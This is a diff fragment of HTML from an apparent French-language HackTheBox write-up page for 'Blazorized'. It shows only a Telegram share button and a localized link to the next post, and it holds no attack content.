+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Blazorized&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -714,7 +707,7 @@ Value = YOUR_ENCODED_JWT
 
             
             <span class="button next">
-                <a href="https://scorpiosec.com/posts/2024/11/thm-seetwo/">
+                <a href="https://scorpiosec.com/fr/posts/2024/11/thm-seetwo/">
                     <span class="button__text">THM: SeeTwo</span>
                     <span class="button__icon">→</span>
                 </a>
